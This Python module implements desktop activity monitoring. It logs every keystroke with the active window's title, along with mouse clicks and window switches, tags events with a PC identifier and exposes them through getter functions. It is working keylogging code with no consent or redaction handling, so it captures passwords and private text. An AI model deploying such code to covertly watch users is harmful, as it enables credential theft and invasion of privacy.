"""
Monitoring Module - Fixed version
Handles keyboard, mouse, and window monitoring
"""
import time
from datetime import datetime
from threading import Thread, Lock
from pynput import mouse, keyboard

try:
    import win32gui
    import win32process
    import psutil
    WINDOWS_SUPPORT = True
except ImportError:
    WINDOWS_SUPPORT = False

# Global state
monitoring = False
events = []
events_lock = Lock()
keystroke_buffer = []
keystroke_lock = Lock()
current_window = None
last_mouse_pos = None
last_activity_time = datetime.now()

# Listeners
mouse_listener = None
keyboard_listener = None
window_thread = None

def get_active_window_title():
    """Get the title of the currently active window"""
    if not WINDOWS_SUPPORT:
        return "Unknown"
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Unknown"

def get_active_window_process():
    """Get process name of active window"""
    if not WINDOWS_SUPPORT:
        return "Unknown"
    try:
        window = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(window)
        process = psutil.Process(pid)
        return process.name()
    except:
        return "Unknown"

def get_last_activity():
    """Get timestamp of last activity"""
    return last_activity_time

def log_event(event_type, details=None, pc_id=None):
    """Log an event with timestamp"""
    event = {
        "timestamp": datetime.now().isoformat(),
        "type": event_type,
        "details": details or {},
        "pc_id": pc_id
    }
    
    with events_lock:
        events.append(event)
        if len(events) > 10000:
            events.pop(0)
    
    return event

def process_keystroke(key):
    """Process keystroke for logging"""
    try:
        char = key.char if hasattr(key, 'char') else str(key)
    except AttributeError:
        char = str(key)
    
    timestamp = datetime.now().isoformat()
    window = get_active_window_title()
    
    with keystroke_lock:
        keystroke_buffer.append({
            "timestamp": timestamp,
            "key": char,
            "window": window
        })
        if len(keystroke_buffer) > 5000:
            keystroke_buffer.pop(0)

def on_click(x, y, button, pressed):
    """Mouse click handler"""
    global last_mouse_pos, last_activity_time, monitoring
    
    if pressed and monitoring:
        last_mouse_pos = (x, y)
        last_activity_time = datetime.now()
        log_event("mouse_click", {
            "x": x,
            "y": y,
            "button": str(button),
            "window": get_active_window_title()
        })

def on_move(x, y):
    """Mouse move handler"""
    global last_mouse_pos, last_activity_time, monitoring
    
    if monitoring:
        if last_mouse_pos is None or \
           abs(x - last_mouse_pos[0]) > 50 or abs(y - last_mouse_pos[1]) > 50:
            last_mouse_pos = (x, y)
            last_activity_time = datetime.now()

def on_press(key):
    """Keyboard press handler"""
    global last_activity_time, monitoring
    if monitoring:
        last_activity_time = datetime.now()
        process_keystroke(key)
        if not hasattr(key, 'char'):
            log_event("key_press", {
                "key": str(key),
                "window": get_active_window_title(),
                "process": get_active_window_process()
            })

def monitor_window_changes():
    """Monitor active window changes"""
    global current_window, monitoring
    while monitoring:
        try:
            window = get_active_window_title()
            if window != current_window and window != "Unknown":
                current_window = window
                log_event("window_change", {
                    "title": window,
                    "process": get_active_window_process()
                })
        except:
            pass
        time.sleep(1)

def start_monitoring(pc_id):
    """Start all monitoring threads"""
    global monitoring, mouse_listener, keyboard_listener, window_thread
    
    if monitoring:
        return {"status": "already_running"}
    
    monitoring = True
    
    mouse_listener = mouse.Listener(on_click=on_click, on_move=on_move)
    mouse_listener.start()
    
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    
    window_thread = Thread(target=monitor_window_changes, daemon=True)
    window_thread.start()
    
    log_event("monitoring_started", pc_id=pc_id)
    return {"status": "started", "pc_id": pc_id}

def stop_monitoring(pc_id):
    """Stop all monitoring"""
    global monitoring, mouse_listener, keyboard_listener
    
    if not monitoring:
        return {"status": "already_stopped"}
    
    monitoring = False
    
    if mouse_listener:
        mouse_listener.stop()
    if keyboard_listener:
        keyboard_listener.stop()
    
    log_event("monitoring_stopped", pc_id=pc_id)
    return {"status": "stopped", "pc_id": pc_id}

def get_monitoring_status():
    """Get current monitoring status"""
    return monitoring

def get_events():
    """Get all logged events"""
    with events_lock:
        return events.copy()

def get_keystrokes():
    """Get all logged keystrokes"""
    with keystroke_lock:
        return keystroke_buffer.copy()